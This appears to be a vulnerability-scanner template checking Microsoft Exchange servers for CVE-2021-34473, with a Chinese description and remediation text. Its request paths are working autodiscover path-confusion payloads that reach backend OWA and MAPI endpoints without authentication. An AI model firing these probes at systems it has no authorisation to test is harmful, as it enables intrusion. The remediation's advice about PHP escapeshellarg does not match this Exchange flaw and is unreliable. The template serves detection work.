id: CVE-2021-34473
info:
  name: Exchange Server - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Microsoft Exchange Server 远程执行代码漏洞
    Microsoft Exchange Server 是微软公司的一套电子邮件服务组件。2021年8月5日，安全研究员在国外安全会议上公开了CVE-2021-34473 Microsoft Exchange Server 远程代码执行漏洞分析及其POC。攻击者利用该漏洞可绕过相关权限验证，进而配合其他漏洞可执行任意代码，控制Microsoft Exchange Server。微软官方已于2021年4月发布针对该漏洞的更新修补程序，阿里云应急响应中心提醒 Microsoft Exchange Server 用户尽快采取安全措施阻止漏洞攻击。
  severity: critical
  remediation: |-
    官方修复建议：
    微软官方于 2021年4月已发布相关补丁，2021年7月发布漏洞通告，可前往微软官方下载相应补丁进行更新：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473

    临时修复建议：

    <br/>1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br/>2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    condition: or
    part: body
    words:
    - Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException
    - Exchange MAPI/HTTP Connectivity Endpoint
  path:
  - '{{BaseURL}}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com'
  - '{{BaseURL}}/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com'
  method: GET
